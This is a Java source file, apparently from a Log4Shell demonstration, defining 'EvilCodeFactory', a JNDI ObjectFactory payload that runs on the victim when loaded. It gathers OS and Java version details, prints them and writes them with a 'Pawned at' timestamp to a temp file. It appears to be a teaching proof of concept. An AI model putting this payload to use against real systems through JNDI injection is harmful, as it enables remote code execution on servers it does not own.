package log4shell.hacker.injection;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.PrintWriter;
import java.nio.file.Path;
import java.time.LocalTime;
import java.util.Hashtable;

/**
 * This class contains code inject by hacker.
 */
public class EvilCodeFactory implements ObjectFactory {

    private static final String SEPARATOR = "\n" + "-".repeat(50) + "\n";

    public static final Path EXPOSE_FILE_PATH = Path.of(System.getProperty("java.io.tmpdir"), "log4shell.txt");

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        String osName = System.getProperty("os.name");
        String osVer = System.getProperty("os.version");
        String javaName = System.getProperty("java.vendor");
        String javaVer = System.getProperty("java.version");

        System.out.println(SEPARATOR);
        System.out.println("This is injected code.");
        System.out.println("As example it exposes OS and Java versions:");
        System.out.println(osName + " " + osVer);
        System.out.println(javaName + " " + javaVer);
        System.out.println(SEPARATOR);

        //save info to file
        try(var fileOut = new PrintWriter(EXPOSE_FILE_PATH.toFile())){
            fileOut.println("Pawned at " + LocalTime.now());
            fileOut.println(osName + " " + osVer);
            fileOut.println(javaName + " " + javaVer);
        }

        return "Kirdik";
    }
}
